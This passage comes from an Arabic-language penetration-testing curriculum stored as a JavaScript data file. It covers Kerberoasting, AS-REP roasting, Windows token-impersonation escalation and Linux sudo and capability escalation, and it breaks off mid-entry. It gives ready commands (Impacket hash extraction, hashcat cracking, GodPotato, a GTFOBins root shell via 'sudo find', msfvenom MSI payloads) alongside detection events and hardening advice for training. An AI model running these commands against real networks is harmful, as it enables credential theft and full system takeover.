1. **AS-REQ / AS-REP:** يرسل المستخدم طلب مصادقة لمتحكم النطاق (KDC)، فيرد بتذكرة أولية تسمى **TGT** (Ticket Granting Ticket) مشفرة بمفتاح الـ krbtgt.
2. **TGS-REQ / TGS-REP:** يقدم المستخدم تذكرة الـ TGT لطلب تذكرة خدمة معينة (TGS) مثل مشاركة ملفات SMB أو قاعدة بيانات.
3. **AP-REQ / AP-REP:** يقدم تذكرة الـ TGS لخادم الخدمة للوصول إليها مباشرة دون إرسال كلمة سره الأصلية.

### 2. أشهر هجمات Active Directory
* **AS-REP Roasting:** استهداف الحسابات التي تم إلغاء خاصية التحقق المسبق (Pre-Authentication) عنها لاستخراج الـ Hashes وفك تشفيرها أوفلاين.
* **Kerberoasting:** طلب تذاكر TGS لحسابات الخدمة المسجلة بـ SPN واستخراجها وتخمين كلمات السر عبر Hashcat.
* **Pass-The-Hash (PtH):** استخدام NTLM Hash المخترق لتسجيل الدخول مباشرة على أجهزة أخرى دون الحاجة لمعرفة كلمة السر الصريحة.
* **Golden Ticket:** في حال السيطرة على حساب \`krbtgt\`، يستطيع المهاجم توليد تذاكر TGT مزورة بصلاحيات Domain Admin صالحة لسنوات!
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'تنفيذ هجوم AS-REP Roasting عبر حزمة Impacket لاستخراج الـ Hashes',
        desc: 'استهداف الحسابات التي لا تتطلب مصادقة مسبقة لاستخراج تذاكرها وفك تشفير كلمات السر أوفلاين.',
        command: 'impacket-GetNPUsers enterprise.lab/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.254 -no-pass',
        flags: [
          { flag: 'GetNPUsers', explanation: 'أداة Impacket الرسمية للاستعلام عن الحسابات التي لا تطلب Pre-Auth' },
          { flag: '-format hashcat', explanation: 'تصدير الـ Hash بصيغة متوافقة مع أداة Hashcat (Mode 18200)' },
          { flag: '-no-pass', explanation: 'تنفيذ الهجوم دون الحاجة لمعرفة أي كلمة سر مسبقة' }
        ],
        expectedOutput: `[*] Getting TGT for jsmith
$krb5asrep$23$jsmith@ENTERPRISE.LAB:2a7c5b...
[*] Written 1 hash to asrep_hashes.txt`,
        proTip: 'فك تشفير هذا الـ Hash مباشرة عبر: hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt.'
      },
      {
        step: 2,
        title: 'تنفيذ هجوم Kerberoasting لسرقة تذاكر حسابات الخدمة SPN',
        desc: 'طلب تذاكر TGS المشفرة بكلمات سر حسابات الخدمات وفكها أوفلاين دون إثارة انتباه أنظمة المراقبة.',
        command: 'impacket-GetUserSPNs enterprise.lab/student:Password123 -dc-ip 10.10.10.254 -request -outputfile kerberoast_hashes.txt',
        flags: [
          { flag: 'GetUserSPNs', explanation: 'استخراج حسابات الخدمات المسجلة بـ Service Principal Names' },
          { flag: '-request', explanation: 'طلب تذكرة TGS لكل خدمة لاستخراج الـ Hash الخاص بها' }
        ],
        expectedOutput: `ServicePrincipalName  Name      MemberOf
--------------------  ----      --------
MSSQLSvc/sql01.corp   sqlservice Domain Admins
[*] Output written to kerberoast_hashes.txt`,
        proTip: 'حسابات الخدمة غالباً ما تمنح صلاحيات إدارية عليا (Domain Admins)، وكسر تذكرة حساب خدمة واحدة يعني السيطرة الكاملة على الدومين في ثوانٍ!'
      }
    ],
    youtubeVideos: [
      {
        title: 'Active Directory Ethical Hacking Course for Beginners',
        channel: 'The Cyber Mentor',
        duration: '2 ساعة كاملة',
        url: 'https://www.youtube.com/watch?v=wQ8bb7q5r3c',
        keyTakeaway: 'الكورس الأشهر عالمياً في فهم وهجمات Active Directory و Kerberos بالتفصيل.'
      },
      {
        title: 'Kerberoasting & AS-REP Roasting Explained in Plain English',
        channel: 'John Hammond',
        duration: '28 دقيقة',
        url: 'https://www.youtube.com/watch?v=7uV8hG8f5fA',
        keyTakeaway: 'تطبيق عملي كامل على أدوات Impacket وكسر الـ Hashes بـ Hashcat.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Active Directory Basics', url: 'https://tryhackme.com/r/room/activedirectorybasics', difficulty: 'Medium', whyMatters: 'شرح مفهوم الغابات والمجالات ومتحكم النطاق والـ OUs.' },
      { name: 'Attacking Kerberos', url: 'https://tryhackme.com/r/room/attackingkerberos', difficulty: 'Hard', whyMatters: 'لابات عملية على هجمات Roasting وتذاكر Golden و Silver.' }
    ],
    writeup: {
      title: 'هجمات كيربيروس واستغلال حسابات الخدمة (AS-REP Roasting & Kerberoasting Case Study)',
      scenario: 'محاكاة هجوم Active Directory داخل بيئة دومين مؤسسية: بدء استطلاع المستخدمين المسجلين، اكتشاف حساب مستخدم مفعل عليه DONT_REQ_PREAUTH وتنفيذ AS-REP Roasting لكسر كلمة سره، ثم طلب تذاكر TGS لحساب خدمة SQL ذو صلاحيات Domain Admin وتنفيذ Kerberoasting أوفلاين مع توثيق أدلة الرصد لفرق الـ SOC.',
      steps: [
        {
          phase: 'Phase 01: Kerberos Pre-Auth Probing & AS-REP Roasting',
          title: 'استكشاف الحسابات المعفاة من التحقق المسبق وسحب الهاش',
          action: 'باستخدام أداة impacket-GetNPUsers، تم إرسال طلب AS-REQ لحسابات الدومين المستكشفة دون الحاجة لأي كلمة سر، واكتشفنا حساب backup_user مفعل عليه خيار "Do not require Kerberos preauthentication" وحصلنا فوراً على تذكرة AS-REP مشفرة بكلمة سر المستخدم.',
          detection: 'تسجل خوادم الدومين كنترولر حدث الأمان Windows Security Event ID 4768 (A Kerberos authentication ticket (TGT) was requested) بخاصية Pre-Auth Type: 0 (بدون مصادقة مسبقة).',
          mitreId: 'T1558.004',
          link: 'https://attack.mitre.org/techniques/T1558/004/',
          linkText: 'توثيق تقنية هجوم AS-REP Roasting في إطار MITRE ATT&CK'
        },
        {
          phase: 'Phase 02: AS-REP Hash Offline Cracking via Hashcat',
          title: 'كسر هاش المستخدم أوفلاين دون إثارة سياسة قفل الحسابات',
          action: 'تم تمرير الهاش لأداة Hashcat باستخدام النمط المخصص: hashcat -m 18200 asrep_hashes.txt /usr/share/seclists/rockyou.txt وتم كسر كلمة السر (Summer2024!) في أقل من دقيقة نظراً لأن عملية الكسر تتم محلياً في كارت الشاشة (Offline) دون أي تواصل مع الخادم.',
          detection: 'لا يظهر هذا الهجوم في سجلات فشل تسجيل الدخول (Event ID 4625) لأنه لا يتصل بالـ Active Directory أثناء التخمين، مما يجعله خفياً تماماً عن سياسات Account Lockout.',
          mitreId: 'T1110.002',
          link: 'https://hashcat.net/wiki/doku.php?id=example_hashes',
          linkText: 'دليل أنماط التجزئة وأمثلة كسر Kerberos في Hashcat'
        },
        {
          phase: 'Phase 03: Targeted Kerberoasting for SPN Accounts',
          title: 'طلب تذاكر TGS لحسابات الخدمة واستخراج تذاكر الخدمات',
          action: 'بحساب المستخدم المخترق، تم استخدام أداة Rubeus لطلب تذاكر TGS لحساب الخدمة svc_sql المرتبط بـ SPN: MSSQLSvc/dc01.corp.local:1433، واستخراج الهاش بنمط Kerberos 5 TGS-REP etype 23 (RC4) لكسره بسهولة.',
          detection: 'تسجل خوادم الـ Domain Controller حدث الأمان Windows Security Event ID 4769 (A Kerberos service ticket was requested) بتشفير Ticket Encryption Type: 0x17 (RC4-HMAC).',
          mitreId: 'T1558.003',
          link: 'https://github.com/GhostPack/Rubeus',
          linkText: 'مستودع أداة Rubeus الشاملة لمعالجة واستغلال بروتوكول Kerberos'
        },
        {
          phase: 'Phase 04: Detection Forensics & Kerberos Hardening',
          title: 'تطبيق التدابير الوقائية وتفعيل حسابات gMSA المشفرة بـ AES',
          action: 'تفعيل خيار Kerberos Pre-Authentication لجميع الحسابات، وترقية حسابات الخدمة إلى Group Managed Service Accounts (gMSA) التي تدير مايكروسوفت كلمات سرها المعقدة (128 حرفاً) وتغيرها تلقائياً كل 30 يوماً وتفرض تشفير AES-256 (0x12).',
          detection: 'يتم رصد تفعيل تشفير AES عبر ظهور Ticket Encryption Type: 0x12 في أحداث Event ID 4769 ورفض تذاكر RC4 الضعيفة.',
          mitreId: 'T1558',
          link: 'https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview',
          linkText: 'التوثيق الرسمي من مايكروسوفت لحسابات الخدمة المدارة gMSA'
        }
      ],
      lessonLearned: 'إلغاء التحقق المسبق (Do not require Kerberos preauthentication) أو استخدام كلمات سر ضعيفة لحسابات الـ SPN يمنح أي مستخدم عادي القدرة على كسر الحسابات أوفلاين دون تنبيه أنظمة منع الاختراق. يجب تفعيل AES-256 إجبارياً واستخدام Group Managed Service Accounts (gMSA) بكلمات سر عشوائية 128-bit تتغير دورياً.'
    },
    secretTradecraft: [
      {
        title: 'استهداف حسابات SPN المشفرة بـ RC4 لتقليل جهد الكسر (Targeted RC4 Kerberoasting)',
        mitreId: 'T1558.003',
        category: 'Kerberos Cryptanalysis & Downgrade',
        explanation: 'عند طلب تذكرة TGS، يطلب المهاجم تذكرة بتشفير RC4 (etype 23) بدلاً من AES-256 عبر التلاعب بحقل التشفير في الطلب (Encryption Type Downgrade). سرعة كسر تشفير RC4-HMAC في Hashcat تزيد بمئات المرات عن سرعة كسر AES-256، مما يتيح كسر كلمات السر في ثوانٍ معدودة.',
        detection: 'يقوم مسؤولو الدومين بتعطيل تشفير RC4 على مستوى بيئة الدومين بالكامل وفرض سياسة Kerberos Encryption Types لتشمل AES128_HMAC_SHA1 و AES256_HMAC_SHA1 فقط.',
        link: 'https://adsecurity.org/?p=3458',
        linkText: 'بحث Sean Metcalf حول حماية وتأمين Kerberos وتحديث خوارزميات التشفير'
      },
      {
        title: 'تجنب طلب التذاكر الجماعية وإطلاق إنذارات MDI (Low-and-Slow Kerberoasting)',
        mitreId: 'T1558.003',
        category: 'Adversary Evasion & SOC Stealth',
        explanation: 'أدوات الفحص التلقائي تطلب تذاكر TGS لجميع حسابات الـ SPN دفعة واحدة (Bulk Requests)، وهو ما يرصده Microsoft Defender for Identity (MDI) فوراً كإنذار "Suspected Kerberoasting attack". المهاجم المحترف يستهدف حساب خدمة واحد عالي الصلاحية (High-Value Target) يحدده مسبقاً عبر BloodHound ويفصل بين الطلبات بساعات.',
        detection: 'تعتمد حلول MDI و EDR على نماذج الذكاء الاصطناعي لرصد شذوذ طلبات التذاكر لحسابات خدمات لا يقوم المستخدم بالاتصال الفعلي بخوادمها.',
        link: 'https://learn.microsoft.com/en-us/defender-for-identity/lateral-movement-alerts#suspected-kerberoasting-attack-kerberos-service-ticket-request',
        linkText: 'توثيق مايكروسوفت لكيفية رصد واكتشاف هجمات Kerberoasting في Defender for Identity'
      },
      {
        title: 'استخراج تذاكر كيربيروس من الذاكرة دون صلاحيات إدارية (Extracting User TGT via Rubeus dump)',
        mitreId: 'T1558.001',
        category: 'In-Memory Ticket Harvesting',
        explanation: 'لا يحتاج المهاجم لصلاحيات Administrator لسحب تذكرة Kerberos TGT الخاصة بالمستخدم الحالي؛ يمكن استدعاء دالة LsaCallAuthenticationPackage عبر Rubeus dump /service:krbtgt واستخراج التذكرة المشفرة مباشرة من جلسة LSA الحالية واستخدامها للتحرك على أجهزة أخرى عبر هجوم Pass-The-Ticket.',
        detection: 'ترصد حلول حماية الهويات محاولات حقن التذاكر (Event ID 4624 Logon Type 9: NewCredentials) حيث يتم استخدام تذكرة هوية مختلفة عن المستخدم المالك للجلسة.',
        link: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication',
        linkText: 'دليل HackTricks المعمق لهجمات وتذاكر Kerberos في بيئات Active Directory'
      }
    ],
    checklist: [
      { id: 'c13_1', text: 'فهم ميكانيكية عمل Kerberos وتبادل تذاكر TGT و TGS.' },
      { id: 'c13_2', text: 'استيعاب هجمات Kerberoasting و AS-REP Roasting وتطبيقها بـ Impacket.' },
      { id: 'c13_3', text: 'القدرة على قراءة وتفسير رسومات مسارات الهجوم في BloodHound.' }
    ],
    officialResources: [
      { name: 'BloodHound Documentation', url: 'https://bloodhound.readthedocs.io', type: 'Documentation' },
      { name: 'Impacket Collection by Fortra', url: 'https://github.com/fortra/impacket', type: 'Tools' }
    ]
  },

  {
    id: 14,
    zoneId: 'zone-ad',
    titleAr: 'المرحلة 14: تصعيد الصلاحيات في ويندوز (Windows Privilege Escalation)',
    titleEn: 'Stage 14: Windows Privilege Escalation — Misconfigurations & Exploits',
    tag: 'Privilege Escalation',
    difficulty: 'متقدم',
    xpReward: 500,
    position: { x: -5, y: 0, z: 25 },
    brief: 'الارتقاء من مستخدم عادي إلى أعلى صلاحية في نظام ويندوز (NT AUTHORITY\\SYSTEM): استغلال مسارات الخدمات غير المحاطة باقتباس (Unquoted Service Paths)، الصلاحيات الإضافية (AlwaysInstallElevated)، انتحال التوكنز (SeImpersonatePrivilege)، وبرمجيات WinPEAS.',
    whyLearn: 'الحصول على شيل عادي كمستخدم محلي لا يمنحك السيطرة على الجهاز أو القدرة على استخراج كلمات السر من الذاكرة أو تعطيل برامج الحماية. تصعيد الصلاحيات هو الجسر الذي يعبر بك من الاختراق السطحي إلى السيطرة المطلقة.',
    professionalApplication: 'يستخدمه مختبرو الاختراق لاكتشاف البرامج المثبتة داخل بيئة الشركات التي تم إعدادها بأذونات ضعيفة، وإثبات خطورة ترك البرمجيات الداخلية دون تدقيق.',
    caseStudy: 'ثغرات PrintNightmare (CVE-2021-34527) التي سمحت لأي مستخدم عادي متصل بشبكة النطاق بتشغيل كود خبيث بصلاحيات SYSTEM كاملة من خلال استغلال خدمة إدارة الطباعة (Print Spooler Service).',
    commonMistakes: [
      'تجاهل فحص صلاحيات المستخدم الحالي عبر أمر `whoami /priv`، حيث يكشف وجود صلاحية `SeImpersonatePrivilege` إمكانية التصعيد الفوري عبر أدوات Potato.',
      'البحث العشوائي عن ثغرات النواة (Kernel Exploits) التي قد تسبب شاشة الموت الزرقاء (BSOD) بدلاً من استغلال الأخطاء الإعدادية البسيطة (Misconfigurations).'
    ],
    detailedGuide: `
### 1. أشهر مسارات تصعيد الصلاحيات في ويندوز
1. **انتحال الرموز (Token Impersonation - SeImpersonatePrivilege):**
   * توجد غالباً في حسابات خدمات الويب (IIS مثل \`iis apppool\\defaultapppool\` أو SQL).
   * تسمح للخادم بانتحال شخصية أي مستخدم مسجل بالشبكة. استغلالها عبر أدوات مثل GodPotato أو SweetPotato يمنحك صلاحية \`NT AUTHORITY\\SYSTEM\` فوراً.
2. **مسارات الخدمات غير المحاطة باقتباس (Unquoted Service Paths):**
   * إذا كان مسار الخدمة: \`C:\\Program Files\\My Service\\service.exe\` بدون علامات تنصيص، يقوم ويندوز بالبحث أولاً عن: \`C:\\Program.exe\` ثم \`C:\\Program Files\\My.exe\`. إذا كان مجلد المسار يسمح بالكتابة لمستخدم عادي، يضع المهاجم ملفه الخبيث باسم \`Program.exe\` ليتم تشغيله كـ SYSTEM عند إعادة تشغيل الخدمة!
3. **تثبيت البرامج بصلاحيات عليا (AlwaysInstallElevated):**
   * مفتاح ريجستري يتيح للمستخدمين العاديين تثبيت حزم MSI بصلاحيات SYSTEM.
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'فحص صلاحيات المستخدم الحالي والتوكنز الممنوحة (whoami /priv)',
        desc: 'أول أمر يجب كتابته في أي شيل ويندوز لمعرفة الصلاحيات المتاحة وإمكانية التصعيد الفوري.',
        command: 'whoami /priv | findstr /i "Impersonate AssignPrimary"',
        flags: [
          { flag: 'whoami /priv', explanation: 'عرض جدول صلاحيات التوكن للمستخدم الحالي' },
          { flag: 'SeImpersonatePrivilege', explanation: 'الصلاحية الذهبية التي تسمح بالتصعيد الفوري إلى SYSTEM عبر Potato Exploits' }
        ],
        expectedOutput: `SeImpersonatePrivilege        Impersonate a client after authentication  Enabled
SeAssignPrimaryTokenPrivilege Replace a process level token              Disabled`,
        proTip: 'إذا رأيت SeImpersonatePrivilege بحالة Enabled، يمكنك فوراً تشغيل أداة GodPotato.exe لتنفيذ أي أمر بصلاحيات SYSTEM كاملة!'
      },
      {
        step: 2,
        title: 'البحث عن مسارات الخدمات غير المحاطة باقتباس (Unquoted Service Paths)',
        desc: 'استعلام WMI للبحث عن الخدمات التي تشغل مسارات تحوي مسافات دون علامات تنصيص.',
        command: 'wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\\windows\\" | findstr /i /v """',
        flags: [
          { flag: 'wmic service', explanation: 'الاستعلام عن الخدمات المثبتة ومسارات ملفاتها التنفيذية' },
          { flag: 'findstr /v', explanation: 'استبعاد خدمات ويندوز القياسية لتصفية النتائج وحصر البرامج الخارجية' }
        ],
        expectedOutput: `Custom Enterprise Monitor  C:\\Program Files\\Enterprise App\\monitor.exe  Auto`,
        proTip: 'تحقق من صلاحيات المجلد عبر: icacls "C:\\Program Files\\Enterprise App". إذا وجدت (F) أو (M) للمجموعة Users، ضع ملفك الخبيث هناك واستعد لاستلام شيل SYSTEM.'
      }
    ],
    youtubeVideos: [
      {
        title: 'Windows Privilege Escalation for Beginners (Full Course)',
        channel: 'The Cyber Mentor',
        duration: '1 ساعة و 40 دقيقة',
        url: 'https://www.youtube.com/watch?v=kHg_mQy2RCE',
        keyTakeaway: 'شرح شامل لجميع مسارات التصعيد في ويندوز وأدوات WinPEAS و Potato Exploits.'
      },
      {
        title: 'Unquoted Service Paths - Windows PrivEsc Walkthrough',
        channel: 'John Hammond',
        duration: '18 دقيقة',
        url: 'https://www.youtube.com/watch?v=7uV8hG8f5fA',
        keyTakeaway: 'تطبيق عملي خطوة بخطوة على فحص واستغلال المسارات غير المحاطة باقتباس.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Windows PrivEsc Lab', url: 'https://tryhackme.com/r/room/winprivesc', difficulty: 'Medium', whyMatters: 'معمل تطبيقي شامل على جميع مسارات تصعيد الصلاحيات في ويندوز.' },
      { name: 'Blue (EternalBlue MS17-010)', url: 'https://tryhackme.com/r/room/blue', difficulty: 'Easy', whyMatters: 'استغلال ثغرة SMB الكلاسيكية للحصول على صلاحيات SYSTEM مباشرة.' }
    ],
    writeup: {
      title: 'تصعيد الصلاحيات في ويندوز عبر انتحال الرموز ومسارات الخدمات (Windows Local Privilege Escalation)',
      scenario: 'محاكاة اختبار اختراق خادم ويندوز داخلي: الحصول على وصول أولي بحساب خدمة الويب iis apppool\\defaultapppool، فحص الصلاحيات واكتشاف SeImpersonatePrivilege، ثم استخدام GodPotato لاستدعاء DCOM واستخراج رمز SYSTEM والسيطرة الكاملة على الخادم.',
      steps: [
        {
          phase: 'Phase 01: Token Privileges Inspection & Discovery',
          title: 'فحص الصلاحيات الممنوحة لتوكن المستخدم الحالي',
          action: 'باستخدام أمر whoami /priv، تم رصد صلاحية SeImpersonatePrivilege مفعلة (Enabled)، وهي الصلاحية الممنوحة لحسابات IIS لتسجيل دخول المستخدمين نيابة عنهم، والتي يمكن استغلالها لانتحال هوية حساب NT AUTHORITY\\SYSTEM.',
          detection: 'تسجل سجلات Windows Security Event ID 4672 (Special privileges assigned to new logon) عند تفعيل جلسات الحسابات ذات الصلاحيات المرتفعة.',
          mitreId: 'T1134.001',
          link: 'https://attack.mitre.org/techniques/T1134/001/',
          linkText: 'توثيق تقنيات انتحال الرموز (Token Impersonation) في إطار MITRE ATT&CK'
        },
        {
          phase: 'Phase 02: DCOM Named Pipe Impersonation via GodPotato',
          title: 'إجبار خدمة النظام على المصادقة عبر DCOM واستخراج الرمز',
          action: 'تم رفع أداة GodPotato.exe وتشغيلها: GodPotato.exe -cmd "cmd.exe /c whoami"، حيث تقوم الأداة بإنشاء خادم DCOM محلي وإجبار خدمة النظام BITS على المصادقة عليه عبر بروتوكول OXID، مما يسمح للأداة بالتقاط رمز الـ SYSTEM وانتحاله.',
          detection: 'ترصد أنظمة EDR (مثل Defender for Endpoint) محاولات الاتصال المشبوهة عبر بروتوكول RPC/DCOM الموجه لمنافذ الـ Loopback وتصنفها كـ Potato Exploit Activity.',
          mitreId: 'T1134.001',
          link: 'https://github.com/BeichenDream/GodPotato',
          linkText: 'مستودع أداة GodPotato الشهيرة لاستغلال صلاحية SeImpersonatePrivilege في ويندوز'
        },
        {
          phase: 'Phase 03: Spawning Elevated NT AUTHORITY\\SYSTEM Process',
          title: 'إنشاء عملية جديدة بصلاحيات SYSTEM وتثبيت الشيل المرتفع',
          action: 'باستخدام الرمز المستخرج، تم استدعاء دالة CreateProcessWithTokenW لإنشاء جلسة PowerShell جديدة بصلاحيات NT AUTHORITY\\SYSTEM كاملة، مما أتاح للفريق تعطيل الحماية وقراءة ملفات الـ SAM.',
          detection: 'تسجل سجلات Sysmon Event ID 1 (Process Creation) إنشاء عملية cmd.exe جديدة بصلاحيات SYSTEM مع وجود Parent Process تعمل بصلاحيات منخفضة (Parent Token Mismatch).',
          mitreId: 'T1134.002',
          link: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer',
          linkText: 'دليل HackTricks لتقنيات انتحال الرموز وأدوات Potato و PrintSpoofer'
        },
        {
          phase: 'Phase 04: Host Hardening & Token Privilege Stripping',
          title: 'معالجة الثغرة وسحب الصلاحية وتأمين حسابات الخدمات',
          action: 'عبر Group Policy Editor، تم سحب صلاحية "Impersonate a client after authentication" من مجموعة IIS_IUSRS، ونقل خدمات الويب لتعمل كـ Virtual Service Accounts مقيدة الصلاحيات دون أي امتيازات نظام إضافية.',
          detection: 'يتم فحص مخرجات whoami /priv للتأكد من اختفاء صلاحية SeImpersonatePrivilege تماماً من سياق حسابات خوادم الويب.',
          mitreId: 'T1548',
          link: 'https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication',
          linkText: 'التوثيق الرسمي من مايكروسوفت لسياسة أمان انتحال رموز العملاء بعد المصادقة'
        }
      ],
      lessonLearned: 'منح حسابات خدمات الويب صلاحيات مثل SeImpersonatePrivilege أو تشغيل الخدمات كـ LocalSystem يتيح لأي ثغرة ويب تحويل المخترق إلى SYSTEM في ثوانٍ. يجب عزل الخدمات وتشغيلها كـ Virtual Accounts دون صلاحيات انتحال الرموز.'
    },
    secretTradecraft: [
      {
        title: 'انتحال رموز المصادقة عبر استدعاءات DCOM / RPC الأنبوبية (Potato Exploits & Token Stealing)',
        mitreId: 'T1134.001',
        category: 'Windows Privilege Escalation Mechanics',
        explanation: 'تعتمد عائلة هجمات Potato (RottenPotato, JuicyPotato, PrintSpoofer, GodPotato) على مبدأ استدعاء وظيفة نظام تعمل كـ SYSTEM وإجبارها على الاتصال بـ Named Pipe أو خادم DCOM يتحكم فيه المهاجم. عند اتصال خدمة النظام، تقوم باستدعاء دالة ImpersonateNamedPipeClient() التي تنسخ رمز الأمان (Security Token) الخاص بالـ SYSTEM ليستخدمه المهاجم لتنفيذ أي أمر يريده.',
        detection: 'ترصد برمجيات EDR استدعاءات دالة OpenProcessToken و ImpersonateNamedPipeClient من عمليات لا تتبع لخدمات النظام الرسمية.',
        link: 'https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/',
        linkText: 'بحث itm4n المرجعي لشرح آلية عمل هجوم PrintSpoofer وانتحال الرموز'
      },
      {
        title: 'التلاعب بمسارات ملفات DLL التابعة للتطبيقات (DLL Hijacking & Phantom DLLs)',
        mitreId: 'T1574.001',
        category: 'Persistence & Privilege Escalation',
        explanation: 'عندما يبحث تطبيق يعمل بصلاحية إدارية عن ملف DLL دون تحديد مساره الكامل، يقوم ويندوز بالبحث في عدة مسارات وفق ترتيب محدد (DLL Search Order). إذا كان أحد هذه المسارات قابلاً للكتابة لمستخدم عادي أو كان ملف الـ DLL مفقوداً أصلاً (Phantom DLL)، يضع المهاجم ملف DLL خبيث بنفس الاسم ليتم تنفيذه تلقائياً عند تشغيل الخدمة.',
        detection: 'تستخدم أدوات المراقبة أداة Process Monitor (ProcMon) لرصد نتائج NAME NOT FOUND لملفات الـ DLL تتبعها محاولات تحميل ملفات من مسارات المستخدمين.',
        link: 'https://attack.mitre.org/techniques/T1574/001/',
        linkText: 'توثيق تقنيات اختطاف ملفات الـ DLL في إطار MITRE ATT&CK'
      },
      {
        title: 'استغلال مفاتيح الريجستري للتثبيت التلقائي المرتفع (AlwaysInstallElevated Abuse via MSI)',
        mitreId: 'T1548.002',
        category: 'Registry Misconfiguration Abuse',
        explanation: 'إذا قام مسؤول النظام بتفعيل مفتاح الريجستري AlwaysInstallElevated في كل من HKLM و HKCU، فإن نظام ويندوز يسمح لأي مستخدم عادي بتثبيت حزم برامج Windows Installer (.msi) بصلاحيات NT AUTHORITY\\SYSTEM كاملة. يمكن للمهاجم توليد حزمة MSI خبيثة بـ msfvenom وتشغيلها عبر msiexec /quiet /i payload.msi ليصبح مديراً للنظام فورياً.',
        detection: 'ترصد أنظمة التدقيق مفاتيح الريجستري المشبوهة عبر استعلام: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated.',
        link: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated',
        linkText: 'دليل HackTricks لاستغلال ثغرة AlwaysInstallElevated في ويندوز'
      }
    ],
    checklist: [
      { id: 'c14_1', text: 'فهم ميكانيكية استغلال SeImpersonatePrivilege وأدوات Potato.' },
      { id: 'c14_2', text: 'إتقان اكتشاف واستغلال ثغرة Unquoted Service Paths.' },
      { id: 'c14_3', text: 'تشغيل أداة WinPEAS وتفسير مخرجات الفحص الأمني الملونة.' }
    ],
    officialResources: [
      { name: 'LOLBAS Project (Living Off The Land Binaries and Scripts for Windows)', url: 'https://lolbas-project.github.io', type: 'Cheatsheet' },
      { name: 'Privilege Escalation - Windows (HackTricks)', url: 'https://book.hacktricks.xyz', type: 'Knowledge Base' }
    ]
  },

  {
    id: 15,
    zoneId: 'zone-ad',
    titleAr: 'المرحلة 15: تصعيد الصلاحيات في لينكس (Linux Privilege Escalation)',
    titleEn: 'Stage 15: Linux Privilege Escalation — SUID, Sudo, Cron & Capabilities',
    tag: 'Privilege Escalation',
    difficulty: 'متقدم',
    xpReward: 500,
    position: { x: -15, y: 0, z: 25 },
    brief: 'الوصول إلى صلاحيات root في أنظمة لينكس: استغلال صلاحيات الـ Sudo الخاطئة (sudo -l)، ملفات الـ SUID مع موقع GTFOBins، مهام الجدولة (Cron Jobs) ذات الصلاحيات الضعيفة، قدرات لينكس (Linux Capabilities)، وأداة LinPEAS.',
    whyLearn: 'في اختبارات eJPTv2 و OSCP وسيناريوهات الاختراق الواقعية، الحصول على شيل كالمستخدم www-data لا قيمة له إذا لم تستطع تصعيد الصلاحية إلى root لقراءة ملفات الـ /etc/shadow وسرقة المفاتيح والسيطرة على الخادم.',
    professionalApplication: 'يستخدمه مختبرو الاختراق لاكتشاف إهمال مديري الأنظمة الذين يمنحون أوامر معينة صلاحيات sudo دون قيود، وتصحيح التكوينات البرمجية لضمان مبدأ أقل صلاحية (Least Privilege).',
    caseStudy: 'ثغرة Baron Samedit في أداة Sudo (CVE-2021-3156) التي سمحت لأي مستخدم محلي عادي على ملايين خوادم لينكس بالحصول على صلاحيات root فوراً دون الحاجة لكلمة سر، نتيجة خطأ في معالجة أحرف الإلغاء (Escape Characters) في معايير سطر الأوامر.',
    commonMistakes: [
      'نسيان تنفيذ أمر `sudo -l` كأول خطوة عند الحصول على شيل المستخدم، لمعرفة الأوامر المسموح بتشغيلها بصلاحيات root دون كلمة سر.',
      'تجاهل التحقق من صلاحيات الكتابة على مسارات مهام الـ Cron في ملف `/etc/crontab`.'
    ],
    detailedGuide: `
### 1. منهجية تصعيد الصلاحيات في لينكس (Step-by-Step Checklist)
1. **فحص الـ Sudo Permissions:** تشغيل \`sudo -l\` لمعرفة ما إذا كان مسموحاً لك بتشغيل أي أمر كـ root (مثل \`sudo find\`, \`sudo vim\`, \`sudo bash\`).
2. **فحص ملفات الـ SUID:** البحث عن الملفات التي تحمل SUID Bit عبر \`find / -perm -4000 2>/dev/null\` ومطابقتها مع GTFOBins.
3. **مهام الجدولة (Cron Jobs):** قراءة ملف \`/etc/crontab\` ومجلدات \`/etc/cron.*\` للبحث عن سكربتات يشغلها root ولكن يملك المستخدم العادي صلاحية تعديلها.
4. **قدرات لينكس (Linux Capabilities):** التحقق من البرامج الممنوحة صلاحيات خاصة مثل \`cap_setuid\` عبر أمر \`getcap -r / 2>/dev/null\`.
5. **الاستطلاع الآلي عبر LinPEAS:** تشغيل سكربت الفحص الشامل الملون لكشف الثغرات ونواقص التكوين فوراً.
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'فحص صلاحيات الـ Sudo الممنوحة للمستخدم (sudo -l)',
        desc: 'أهم وأسرع أمر في اختبارات eJPTv2 لمعرفة ما إذا كان بإمكانك القفز فوراً إلى root.',
        command: 'sudo -l',
        flags: [
          { flag: 'sudo -l', explanation: 'عرض قائمة الأوامر المسموح بتشغيلها بصلاحيات root للمستخدم الحالي' },
          { flag: 'NOPASSWD', explanation: 'مؤشر على إمكانية تشغيل الأمر دون المطالبة بكلمة سر المستخدم' }
        ],
        expectedOutput: `Matching Defaults entries for student on victim-box:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:...
User student may run the following commands on victim-box:
    (ALL : ALL) NOPASSWD: /usr/bin/find`,
        proTip: 'إذا وجدت /usr/bin/find متاحاً بـ NOPASSWD، طبق فوراً أمر GTFOBins: sudo find . -exec /bin/bash \\; -quit وستحصل على شيل root فوراً!'
      },
      {
        step: 2,
        title: 'استغلال قدرات لينكس (Linux Capabilities) للحصول على root',
        desc: 'البحث عن الملفات التنفيذية التي منحت قدرات خاصة تمكنها من تغيير الـ UID إلى 0.',
        command: 'getcap -r / 2>/dev/null | grep -E "cap_setuid|cap_setgid"',
        flags: [
